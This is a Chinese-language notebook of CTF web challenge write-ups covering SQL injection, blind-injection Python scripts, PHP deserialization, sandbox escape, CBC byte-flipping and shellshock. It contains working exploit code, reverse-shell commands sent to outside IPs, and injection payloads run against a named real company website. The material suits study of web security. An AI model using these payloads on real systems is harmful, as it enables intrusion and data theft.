# web做题笔记

## ROIS

### base-lanauage

直接给源代码

这题不难只是麻烦

get新知识点:

当php的array_search试图在数字数组中寻找字符串时，会把字符串变成0

麻烦点:

```php
$x3 = $_GET['x3'];  
if ($x3 != '15562') {  
    if (strstr($x3, 'XIPU')) {  
        if (substr(md5($x3),8,16) == substr(md5('15562'),8,16)) {  
            $d=1;  
        }  
    } else{ 
        die('1'); 
    } 
} 
```

写个脚本慢慢跑吧刚开始是打算前4位固定然后随机碰撞,后来发现太慢就参考别人的按数字递增的方法



### baby_upload

```php
<?php 
include 'function.php';  
if(isset($_GET['do']))  
{  
    $do=$_GET['do'];  
    if($do=='upload')  
    {  
        if(empty($_FILES))  
        {  
            $html1=<<<HTML1 
            <form action="index.php?do=upload" method="post" enctype="multipart/form-data">  
            <input type="file" name="filename">                   
            <input type="submit" value="upload">  
            </form>  
HTML1; 
            echo $html1;  
        }  
        else  
        {    
            $file=@file_get_contents($_FILES["filename"]["tmp_name"]);  
            if(empty($file))  
            {  
                die('do you upload a file?');  
            }  
            else  
            {  
                if((strpos($file,'<?')>-1)||(strpos($file,'?>')>-1)||(stripos($file,'php')>-1)||(stripos($file,'<script')>-1)||(stripos($file,'</script')>-1))  
                {  
                    die('you can\' upload this!');  
                }  
                else  
                {  
                    $rand=mt_rand();  
                    $path='/var/www/html/uploads/'.$rand.'.txt';  
                    file_put_contents($path, $file);  
                    echo 'your upload success!./uploads/'.$rand.'.txt';  
                }  
            }  
              
        }  
          
    }  
    elseif($do=='rename')  
    {  
        if(isset($_GET['re']))  
        {  
            $re=$_GET['re'];  
            $re2=@unserialize(base64_decode(unC4es4r($re,6)));  
            if(is_array($re2))  
            {  
                if(count($re2)==2)  
                {     
                    $rename='txt';  
                    $rand=mt_rand();  
                    $fp=fopen('./uploads/'.$rand.'.txt','w');  
                    foreach($re2 as $key=>$value)  
                    {  
                        if($key==0)  
                        {  
                            $rename=$value;  
                        }  
                        else  
                        {  
                            if(file_exists('./uploads/'.$value.'.txt')&&is_numeric($value))  
                            {  
                                $file=file_get_contents('./uploads/'.$value.'.txt');  
                                fwrite($fp,$file);  
                            }  
                        }  
                    }  
                    fclose($fp);  
                    rename('./uploads/'.$rand.'.txt','./uploads/'.$rand.'.'.$rename);  
                    echo "you success rename!./uploads/$rand.$rename";  
                }  
            }  
            else  
            {  
                echo 'please not hack me!';  
            }  
        }  
        elseif(isset($_POST['filetype'])&&isset($_POST['filename']))  
        {  
            $filetype=$_POST['filetype'];  
            $filename=$_POST['filename'];  
            if((($filetype=='jpg')||($filetype=='png')||($filetype=='gif'))&&is_numeric($filename))  
            {     
                $re=C4es4r(base64_encode(serialize(array($filetype,$filename))),6);  
                header("Location:index.php?do=rename&re=$re");  
                exit();  
            }  
            else  
            {  
                echo 'you do something wrong';  
            }  
        }  
        else  
        {  
            $html2=<<<HTML2 
            <form action="index.php?do=rename" method="post">            
filetype: <input type="text" name="filetype" /> please input the your file's type  
</br>  
filename: <input type="text" name="filename" /> please input your file's numeric name,like 12345678  
</br>  
<input type="submit" />  
</form>  
HTML2; 
            echo $html2;  
              
        }  
    }  
      
}  
else  
{     
    show_source(__FILE__);  
}
```

代码审计

发现上传内容被严格控制,文件名不可控

但是发现重命名函数有可以利用的地方

1. 只要能破解加密方式后缀名可控
2. 只要能破解加密方式可以粘合两个文件

解法已经出来了

贴出exp

```python 
import base64
import requests
def C4es4r(message):
    key=6
    translated = ''
    for symbol in message:
        if symbol.isalpha():
            num = ord(symbol)
            if symbol.isupper():
                num += key
                if num > ord('Z'):
                    num -= 26
                elif num < ord('A'):
                    num += 26
            elif symbol.islower():
                num -= key
                if num > ord('z'):
                    num -= 26
                elif num < ord('a'):
                    num += 26

            translated += chr(num)
        else:
            translated += symbol
    return translated


def serialize_arr(v1,v2,v1_num,v2_num):
    return 'a:2:{i:'+v1_num+';s:'+str(len(v1))+':"'+v1+'";i:'+v2_num+';s:'+str(len(v2))+':"'+v2+'";}';

def enc(v1,v2,v1_num,v2_num):
    return C4es4r(base64.b64encode(serialize_arr(v1,v2,v1_num,v2_num).encode('utf-8')).decode('utf-8'))

def send(url):
    text=requests.get(url).text
    print(text)
    return (text[text.index('/uploads/')+9:-4])
    
def addtxt():
    
    # '<' in './uploads/1706652843.txt'
    #'?ph' in './uploads/898870403.txt'
    #'p eval($_POST['a']); ?' in './uploads/143483779.txt'
    #'>' in './uploads/1062873240.txt'


    url='http://0.ctf.rois.io:20010/index.php/?do=rename&re='

    arr=['1706652843','898870403','143483779','1062873240']
    firnum=arr[0]
    for i in arr[1:]:
        secnum=i
        rurl=url+enc(firnum,secnum,'1','2')
        firnum=send(rurl)

    print(firnum)
    

url='http://0.ctf.rois.io:20010/index.php/?do=rename&re='+enc('php','468983224','0','1')
print(requests.get(url).text)
```



### baby_sql

```php+HTML
<?php
require 'includes/db.php';

$id = $_GET['id'] ?? '0';
if (preg_match('/AND|OR|\||\&|\^/i', $id)) {
    exit('Hacker');
}
$ret = $db->exec('SELECT * FROM users WHERE id = ' . $id);
// select ? from flag
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>
    <?php show_source(__FILE__);?>
</body>
</html>
```



刚看这题，用了各种测试都没有任何反应，我还以为是题目错了。

问了一下发现没错，然后我才想起sql时间盲注(我太菜了。。)

```python 
import requests
def judge(index,guess):
    url1="http://0.ctf.rois.io:20009/?id=1%20union%20select%20if(ascii(substr((select%20flag%20from%20flag),"
    url2=",1))%3d"
    url3=',sleep(6),0)#'
    rurl=url1+str(index)+url2+str(guess)+url3
    try :
        requests.get(rurl,timeout=6)
        print('第'+str(index)+'字母不是'+chr(guess))
        return 0
    except requests.exceptions.ReadTimeout:
        print('success,'+'第'+str(index)+'字母是'+chr(guess))
        return 1
    

result='ROIS'
index=1+4
while 1:
    alpha=0
    
    for i in range(32,128):
        if judge(index,i):
            alpha=i
            result+=chr(i)
            break
    if alpha==0:
        print('爆破完成:'+result)
        break
    index+=1
```

flag:ROIS{3fb8cda3-46fc-3088-b014-583fe52b450e}

### myblog

- level 1
  最普通的sql注入

- level 2
  万能密码

- level3

  双写绕过
  payload:1' uniunionon selselectect database(),2,3#

- level 4
  大小写混合绕过
  payload:1' uNion SeLect 1,2,3#

- level 5
  /**/代替空格
  payload:1'/\*\*/union/\*\*/select/\*\*/1,2,3#

- level 6
  虽然题目限制了我们使用引号
  但是题目是个好人啊，主动提供引号给我们用

  ```php
   $query = "SELECT * FROM search_engine WHERE title LIKE '" . $_GET['q'].  "' OR description LIKE '" . $_GET['q'] .  "' OR link LIKE '" . $_GET['q'] . "';";
  ```

  在这条语句中我们看到很多引号，而\可以转义特殊字符,#如果不在引号内可以当场注释标记

  令q=\时第二个q逃出引号区域然后用#让后面那串语法错误的内容注释掉

  payload:union select 1,2,3#\

- level 7
  这次是啥代码都不给了

  影响不大

  注入点是id

  多次测试后发现这是个数字不用闭合引号

  空格在黑名单中

  构造:

  ```php
  id=2/**/oorr/**/length(%27a%27)=1
   用这个来检测会替换啥
  ```

  替换:

  union,select,or,from,where,不测了

  payload:

  ```php
  1.'-1/**/UNIunionON/**/SELselectECT/**/GROUP_CONCAT(table_name)/**/FRfromOM/**/infoorrmation_schema.tables/**/WHEwhereRE/**/TABLE_SCHEMA=database()' 
      table:motivation
  2."-1/**/UNIunionON/**/SELselectECT/**/GROUP_CONCAT(column_name)/**/FRfromOM/**/infoorrmation_schema.columns/**/WHEwhereRE/**/table_name=%27motivation%27"
      column_name='id,text'
  3."-1/**/UNIunionON/**/SELselectECT/**/GROUP_CONCAT(text)/**/FRfromOM/**/motivation"
        
  ```

  

## xman 个人排位赛



### escape

收获:了解了python沙箱逃逸这种类型

getattr:对沙箱逃逸有很大作用





list(s)获得字符集,可以用来绕过引号限制

试了一下system

```python
banned=  ["'", '"', '.', 'reload', 'open', 'input', 'file', 'if', 'else', 'eval', 'exit', 'import', 'quit', 'exec', 'code', 'const', 'vars', 'str', 'chr', 'ord', 'local', 'global', 'join', 'format', 'replace', 'translate', 'try', 'except', 'with', 'content', 'frame', 'back']
```

发现引号和点都被过滤了,不过提示说

```python
def hello():
   os.system("echo hello")
```



说明是可以通过调用system来完成,接下来就是想办法得到system函数了

而引号被过滤可以用字符串s里的值来绕过



```python
#考虑这样来
a=getattr(os,'system')
a("命令")
```

```python
def get_str(string):
    result=''
    for i in string:
        result+='table['+str(table.index(i))+']+'
    return result[:-1]
conn=remote('47.97.253.115',10005)
conn.sendline('table=list(s)')
conn.sendline('sys='+get_str('system'))
conn.sendline('fun=getattr(os,sys)')
while 1:
        command=input('(www):$')
        new_com='fun('+get_str(command)+')'
        conn.sendline(new_com)
        print(conn.recvuntil('>>>'))
conn.close()

```



flag{4EEAA88DA0B3207862D2E4876AF84A3D}

### **ezphp**



收获:知道了curl_exec 本地文件读取

```php
<?php

class Hello {
    protected $a;

    function test() {
        $b = strpos($this->a, 'flag');
        if($b) {
            die("Bye!");
        }
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $this->a);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
        echo curl_exec($c);
    }
    
    function __destruct(){
        $this->test();
    }
}

if (isset($_GET["z"])) {
    unserialize($_GET["z"]);
} else {
    highlight_file(__FILE__);
}
```



curl_exec+反序列化

试了下本地文件读取

O:5:"Hello":1:{s:1:"a";s:27:"file://localhost/etc/passwd";}

![](http://ww1.sinaimg.cn/large/006pWR9agy1g5uwj7l0c4j30wp0ax407.jpg)

题目过滤flag字符

说明我们flag就在flag文件里

谷歌看了好久，后来看一道又curl_exec的题目，获得了url二次编码的思路

最后的payload:

http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}

这里有一些坑就是:

1. 你不知道flag文件在哪个文件夹,结果最后就在根目录。。

2. 因为是二次编码所以要注意字符串的长度

## xman练习



### wtf.sh

我这题做了两天，一直想放个后门进去

最后还是一句一句话的执行

这题最难的地方在于代码审计，我很早就搞到源代码了可就是分析不出什么。

我在分析代码的时候仅仅只是看代码，这还不够，我必须时刻都想这里有没有漏洞，如果有我要怎么利用

### i-got-id-200

这题用了一个我没学过的语言perl

看别人的wp知道了perl的一些漏洞





```perl
use strict;
use warnings;
use CGI;
 
my $cgi= CGI->new;
if ( $cgi->upload( 'file' ) )
{
my $file= $cgi->param( 'file' );
while ( <$file> ) { print "$_"; } }
```

![](http://ww1.sinaimg.cn/large/006pWR9agy1g5s8gm8ve5j30rc0m00wn.jpg)

param()返回name=file的所有参数,但是只有第一个值才能传给$file变量,当$file="ARGV"时,perl会调用open()访问url的参数

可以通过 /bin/bash%20-c%20......来getshell

`/cgi-bin/file.pl?/bin/bash%20-c%20ls| `





## 攻防世界

### ics-06

进入index.php后发现id和page可以传参。

对id和page做了各种测试

发现id只能接受数字,page传啥都没用

可是我的关注度一直都在page那，看了别人的wp发现这题对burp进行爆破，当id=2333时,flag出现

cyberpeace{955bb6e63c29755aeb2f36fc33b3b57f}

## bugku

### login3

这题我没有认真的做分析记录，如果有了分析记录可能有就会自己独立完成

收获:

绕过空格:^,&&,||,括号综合利用

绕过逗号:mid('a'from(1))





测试admin,123说密码错误,再随便测试发现,会提示username doesn't exist 说明网站的查询语句可能是

```php
$sql1='select * from user where username='+$_POST['user'];
```

根据题目的提示：盲注,说明盲注点很有可能在这里

测试黑名单

> 空格,*,and,逗号,=,for，union

for(大小写混合都不行)在黑名单中意味着我们无法查找表名和字段名,只能靠猜测表名了

猜测表名为admin,user,password



因为空格在黑名单所以可以用^，&&,||来绕过

验证:admin'&&0#成功



验证表名adminn'&&(select(1)from(admin))#,表名为admin

盲注格式:admin'ascii(mid(('a')from(1)))#

猜测字段名:password,pass,pwd

=admin'&&ascii(mid((select(password)from(admin))from(1)))#

字段名为password



盲注脚本跑起来

```python
import requests
def judge(index,guess):
    username="admin'&&ascii(mid((select(password)from(admin))from(index)))<>guess#"
    url='http://123.206.31.85:49167/index.php'
    rusername=username.replace('index',str(index)).replace('guess',str(guess))
    result=requests.post(url,data={'username':rusername,'password':'123456'}).text
    if 'password error!' in result:
        print('第'+str(index)+'个字符不是'+chr(guess))
        return 0
    print('第'+str(index)+'个字符是'+chr(guess))
    return 1

result=''
index=1
while 1:
    alpha=0
    
    for i in range(32,128):
        if judge(index,i):
            alpha=i
            result+=chr(i)
            break
    if alpha==0:
        print('爆破完成:'+result)
        break
    index+=1

```

得到:51b7a76d51e70b419f60d3473fb6f900

这个是md5加密后的,解密得到skctf123456

flag: SKCTF{b1iNd_SQL_iNJEcti0n!}

### login 4

cbc字节翻转攻击



根据别人的wp,发现vim不正常退出产生的文件.index.php.swp,`vim -r` 获得源码

```php
<?php
define("SECRET_KEY", file_get_contents('/root/key'));
define("METHOD", "aes-128-cbc");
session_start();

function get_random_iv(){
    $random_iv='';
    for($i=0;$i<16;$i++){
        $random_iv.=chr(rand(1,255));
    }
    return $random_iv;
}

function login($info){
    $iv = get_random_iv();
    $plain = serialize($info);
    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    $_SESSION['username'] = $info['username'];
    setcookie("iv", base64_encode($iv));
    setcookie("cipher", base64_encode($cipher));
}

function check_login(){
    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){
        $cipher = base64_decode($_COOKIE['cipher']);
        $iv = base64_decode($_COOKIE["iv"]);
        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
            $info = unserialize($plain) or die("<p>base64_decode('".base64_encode($plain)."') can't unserialize</p>");
            $_SESSION['username'] = $info['username'];
        }else{
            die("ERROR!");
        }
    }
}

function show_homepage(){
    if ($_SESSION["username"]==='admin'){
        echo $flag;
    }else{
        echo '<p>hello '.$_SESSION['username'].'</p>';
        echo '<p>Only admin can see flag</p>';
    }
    echo '<p><a href="loginout.php">Log out</a></p>';
}

if(isset($_POST['username']) && isset($_POST['password'])){
    $username = (string)$_POST['username'];
    $password = (string)$_POST['password'];
    if($username === 'admin'){
        exit('<p>admin are not allowed to login</p>');
    }else{
        $info = array('username'=>$username,'password'=>$password);
        login($info);
        show_homepage();
    }
}else{
    if(isset($_SESSION["username"])){
        check_login();
        show_homepage();
    }else{
        echo '<body class="login-body">
                <div id="wrapper">
                    <div class="user-icon"></div>
                    <div class="pass-icon"></div>
                    <form name="login-form" class="login-form" action="" method="post">
                        <div class="header">
                        <h1>Login Form</h1>
                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>
                        </div>
                        <div class="content">
                        <input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" />
                        <input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" />
                        </div>
                        <div class="footer">
                        <input type="submit" name="submit" value="Login" class="button" />
                        </div>
                    </form>
                </div>
            </body>';
    }
}
?>
```

阅读代码发现通过控制cipher的值进而控制session的值来获得flag

因为这是一个cbc加密后的字符串而我们又知道它的明文,通过cbc字节翻转来攻击

字节翻转攻击

```python
import base64
iv='w+tXOtqCoxQHWWvQOzLYDg=='.decode('base64')
ci="CVWXZDimKKgGoXMsKos0UOHdMzG/d2bB+v1WqC6bOongufcRUyB5fgiiJdlLG1CDwKCfkdXXzCrru0wL2F749g==".decode('base64')
old='a:2:{s:8:"username";s:5:"skctf";s:8:"password";s:5:"skctf";}'[16:32]
new='a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"skctf";}'[16:32]
for i in range(16):
        ci=ci[:i]+chr(ord(ci[i])^ord(old[i])^ord(new[i]))+ci[i+1:]

```

得到![](http://ww1.sinaimg.cn/large/006pWR9agy1g5y9g9f9t6j310t02bglp.jpg)

解码后:

![](http://ww1.sinaimg.cn/large/006pWR9agy1g5y9gny8nxj30dc01ja9v.jpg)

我们要回复前面的值,而题目又给了我们初始变量iv,所以按刚刚的步骤再来一下即可

### login2

收获: 不仅可以过滤输入,还可以过滤输出



提示:union,命令执行

看到http里的tip:

```php
$sql="SELECT username,password FROM admin WHERE username='".$username."'";
if (!empty($row) && $row['password']===md5($password)){
}
```

payload:`aaaaa'/**/union/**/select/**/'aaaaa','cfcd208495d565ef66e7dff9f98764da'#`

进入![](http://ww1.sinaimg.cn/large/006pWR9agy1g5ya1d4t7cj30db05d0su.jpg)

黑名单:`|,&,空格,像引号一样的东西`

输入a和'a'发现结果不同,猜测引号被过滤,或者在引号里面

输入a和a;发现结果不同,猜测分号被过滤,或者在引号里面

输入#无任何显示,输入不在引号内

`0'#和0"#均无回显`,

过滤名单:`'',"",#;`

猜测php代码

`echo system('ps -aux | grep '.$u)`



最后还是没做出来,去看别人的wp了

有两种解法

#### 解法1

我刚刚的那些猜测考虑的不够全面,以上结果还有一种可能就是过滤输出。

执行a;sleep 5发现延迟5秒，确定是过滤输出而不是过滤那些字符

接下来就是和sql盲注一样的原理

payload:123;a=\`ls\`;b="~";if [ "${a:3:1}"x == "$b"x ]; then sleep 5 ;fi;

构造payload(写shell语言)遇到的坑:

1. if 和方括号之间要有空格
2. $a == $b 之间也要有空格
3. 让字符串为空返回假,非空进行比较用

123;a=\`ls\`;b="~";if [ "${a:3:1}"x == "$b"x ]; then sleep 5 ;fi;

否则,字符串为空也会继续比较

附上exp:

```python
import requests
cookies = dict(PHPSESSID='uep9a3ja59naqj5rnuihbi5l62')

def guess(index,gue,post):
    data={'c':post}
    try:
        print(post)
        res=requests.post("http://123.206.31.85:49165/index.php",data=data,timeout=3,cookies=cookies)
        if 'login' in res:
            print("cookie失效")
        #input()
        print("第"+index+"个字符不是"+gue)
        return 0
    except requests.exceptions.ReadTimeout:
        print("第"+index+"个字符是"+gue)
        return 1
    except requests.exceptions.ConnectTimeout:
        print("第"+index+"个字符是"+gue)
        return 1
    except urllib3.exceptions.MaxRetryError:
        print("第"+index+"个字符是"+gue)
        return 1
    except urllib3.exceptions.ConnectTimeoutError:
        print("第"+index+"个字符是"+gue)
        return 1
def execc(command):
    post1="123;a=`"+command
    post2='`;b="'
    gue=""
    post3='";if [ "${a:'
    index=""
    post4=':1}"x == "$b"x ]; then sleep 5 ;fi;'
    count=0
    result=''
    while 1:
        alpha=''
        for i in range(0,127):
            index=str(count)
            gue=chr(i)
            print('gue 是:'+gue)
            if guess(index,gue,post1+post2+gue+post3+index+post4):
                alpha=gue
                result+=gue
                break
        if alpha=='':
            print("爆破完成:"+result)
            break
        print(result)
        count+=1
execc("ls")
```



#### 解法2

执行反弹shell的命令:

`|bash -i >& /dev/tcp/你的公网ip/8888 0>&1`

`nc -lvv 8888`

flag:为SKCTF{Uni0n_@nd_c0mM4nD_exEc}

### 实战2-注入

这个是真的实战。。。

给了一个网址:[http://www.kabelindo.co.id](http://www.kabelindo.co.id/)

在提示下找到了注入点。



测试

```
http://www.kabelindo.co.id/readnews.php?id=-5%20union%20select%201,2,3,database(),5#
对单引号和双引号进行了转义,尝试宽字节注入没用

用hex编码绕过

```

构造payload:id=-5%20union%20select%201,2,3,database(),5#

查询表名:id=`-5 union select 1,2,3,GROUP_CONCAT(table_name) ,5 FROM information_schema.tables WHERE TABLE_SCHEMA=database(); #`

table:**counter,csr,lowongan,mstdkb,mstdsg,mstpro,news,opsod,opsoh,pencarian,tabcus,tabgrp,tabmenu,tabmenu1,tabmenu2,tabprog,tabshp,tabslp,tabtcus,tabtmp,tabuser,tbnomax**

查询列名:id= `-5 union select 1,2,3,GROUP_CONCAT(column_name),5 FROM information_schema.columns WHERE table_name = 0x6373#`

flag: flag{tbnomax}

一个地方显示字数有限制。。。

## jarvis oj

### re?



这题看了别人的wp才知道怎么做

下载下来后文件名为`udf.so.XXXXX`，用mysql导入一下。具体过程如下。
将udf文件放到`/usr/lib/mysql/plugin/`文件夹中：

```
root@0e5b63de05fd:/usr/lib/mysql/plugin# wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172
```



登陆mysql后，加载help_me函数：

```
mysql> create function help_me returns string soname 'udf.so.02f8981200697e5eeb661e64797fc172';Query OK, 0 rows affected (2.04 sec)
```



利用help_me函数：

```
mysql> select help_me();+---------------------------------------------+| help_me()                                   |+---------------------------------------------+| use getflag function to obtain your flag!! |+---------------------------------------------+1 row in set (0.17 sec)
```



利用udf再创建一个getflag函数。

```
mysql> create function getflag returns string soname 'udf.so.02f8981200697e5eeb661e64797fc172';Query OK, 0 rows affected (0.05 sec)
```



得到flag：

```
mysql> select getflag();+------------------------------------------+| getflag()                                |+------------------------------------------+| PCTF{Interesting_U5er_d3fined_Function} |+------------------------------------------+1 row in set (0.00 sec)
```

## hackme

###  hide and seek

这题给了主页的地址，我还以为是题目错了。。我还在想是不是排行榜的flag交了一下，过了，但是没解决，后来看了别人的wp想了又想最后还是在主页里查了下flag，提交成功。。。。。。。

### guestbook

最基础的sql注入

有个坑就是flag放在第二行，我还傻逼必的把第一行提供的图片做了各种分析

### ping

这题看过去ban掉了很多，但他千不该万不该没ban掉\`和*

### scoreboard

.....去看了源代码,还以管理员的方式登录,结果flag就在head里面。。

### login3

```php
function load_user()
{
    global $secret, $error;

    if(empty($_COOKIE['user'])) {
        return null;
    }

    $unserialized = json_decode(base64_decode($_COOKIE['user']), true);
    $r = hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig'];

    if(hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']) {
        $error = 'Invalid session';
        return false;
    }

    $data = json_decode($unserialized['data'], true);
    return [
        'name' => $data[0],
        'admin' => $data[1]
    ];
}

```

一开始我还想着用sha那啥攻击

后来看到了!=，有希望，当"123"!=true为真,成功绕过

### login4

```php
if($_POST['name'] === 'admin') {
    if($_POST['password'] !== $password) {
        // show failed message if you input wrong password
        header('Location: ./?failed=1');
    }
}
```

重定向后面没加exit()

后面的代码仍然执行

### login6



```php
if(!empty($_POST['data'])) {
    try {
        $data = json_decode($_POST['data'], true);
    } catch (Exception $e) {
        $data = [];
    }
    extract($data);
    if($users[$username] && strcmp($users[$username], $password) == 0) {
        $user = $username;
    }
}
```

这题原本有两种思路的:1.extract变量覆盖2.字符串==true成立

但是题目的$user里没有admin的值,所以只能用变量覆盖,因为这个原因我卡了好久



### login8

大胆猜想小心求证

这次题目不给源码了

虽然我很快注意到了解题的关键cookie:login8cookie和login8sha512

我确认login8cookie是序列化，但是我却没有经过任何验证就在心中认定sha512是有密钥加密的.

最后看了别人的wp才走出自己的误区

### dafuq-manager 2

这题登入游客账号后，发现有个编辑，点进去看一下，试一下任意文件读取，成功

### dafuq-manager 3

代码审计软件真的好香。不过它的原理也只是用正则匹配敏感函数

发现有个debug模式

```php
<?php
function make_command($cmd) {
    $hmac = hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]);
    return sprintf('%s.%s', base64_encode($cmd), $hmac);
}
function do_debug() {
	print("<br />".$GLOBALS['__GET']['command']);
	print("<br />".(make_command($GLOBALS['__GET']['command'])."<br />"));
    assert(strlen($GLOBALS['secret_key']) > 40);
    $dir = $GLOBALS['__GET']['dir'];
    if (strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")) {
        show_error('You are not hacky enough :(');
    }
    list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2);
    $cmd = base64_decode($cmd);
    $bad_things = array('system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl',);
    foreach ($bad_things as $bad) {
        if (stristr($cmd, $bad)) {
            die('2bad');
        }
    }
    if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]), $hmac)) {
        die(eval($cmd));
    } else {
        show_error('What does the fox say?');
    }
}
?>
```

阅读代码利用即可

### wordpress 1

这题刚看的时候以为是去看网页源代码。。

结果是看源代码。。仔细看一下发现博客里有提供备份文件

用正则匹配`.*f[l1][a4]g.*`

找到flag所在位置

```PHP
function print_f14g()
{
	$h = 'm'.sprintf('%s%d','d',-4+9e0);
	if($h($_GET['passw0rd']) === '5ada11fd9c69c78ea65c832dd7f9bbde') {
		if(wp_get_user_ip() === '127.0.0.1') {
			eval(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET['passw0rd'].AUTH_KEY), base64_decode('zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='), MCRYPT_MODE_CBC, $h($_GET['passw0rd'].AUTH_SALT)));
		} else {
			die('</head><body><h1>Sorry, Only admin from localhost can get flag');
		}
	}
}
```

### webshell

这题很简单，就是remote_addr不好搞,必须得用服务器来测

```php
<?php 
$cation = "str_rot13";
$e_obfus="base64_decode";
$e_cod = "gzinflate" ; 
$sourc ="strrev"; 
 function run() 
 { 
     if(isset($_GET['cmd']) ) 
     { 
         $cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd'];
         $key = $_SERVER['HTTP_USER_AGENT'] . sha1("webshell.hackme.inndy.tw"); 
         $sig = hash_hmac('SHA512', $cmd, $key); 
         echo  urlencode(hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd']);
         echo "<br />";
         echo hash_hmac('SHA512', $_GET['cmd'], $key); 

    } 
    return false; 
} 

    run();
?>
```

### command-executor

收获:shellshock



https://command-executor.hackme.inndy.tw/index.php

刚开始的时候以为是命令执行绕过,试过大部分绕过方法都没用后,观察url发现:https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env

func参数也可能是注入点,多次尝试发现这不是命令执行,猜测这是文件包含,试着用php://filter来读取源码成功.

```
cmd.php
index.php
ls.php
man.php
untar.php
```

代码审计时间......

花了好久都没看出啥,最后看别人的wp发现有shellshock漏洞

index.php:`putenv("$key=$val");`

[详解shellcode](https://blog.csdn.net/Anprou/article/details/72819989)

构造payload:`User-Agent: () { : ;};/bin/bash -i &> /dev/tcp/39.108.164.219/60000 0>&1;`

记住:;和两个花括号之间必须有空格

利用反弹shell

找到flag在根目录下,但是无法读取,但发现flag_reader和他的源码

```c
#include <unistd.h>
#include <syscall.h>
#include <fcntl.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char buff[4096], rnd[16], val[16];
	if(syscall(SYS_getrandom, &rnd, sizeof(rnd), 0) != sizeof(rnd)) {
		write(1, "Not enough random\n", 18);
	}

	setuid(1337);
	seteuid(1337);
	alarm(1);
	write(1, &rnd, sizeof(rnd));
	read(0, &val, sizeof(val));

	if(memcmp(rnd, val, sizeof(rnd)) == 0) {
		int fd = open(argv[1], O_RDONLY);
		if(fd > 0) {
			int s = read(fd, buff, 1024);
			if(s > 0) {
				write(1, buff, s);
			}
			close(fd);
		} else {
			write(1, "Can not open file\n", 18);
		}
	} else {
		write(1, "Wrong response\n", 16);
	}
}

```

`flag-reader flag > /var/tmp/aaa < /var/tmp/aaa`

最后的flag:FLAG{W0w U sh0cked m3 by 5h3115h0ck}

## 杂

### 2019suctf CheckIn

这一题是个文件上传,限制了后缀为ph*和.htaccess的文件

我一直试都没弄出来后来看别人的wp说使用.user.ini,fastcgi都可以用,学到了学到了

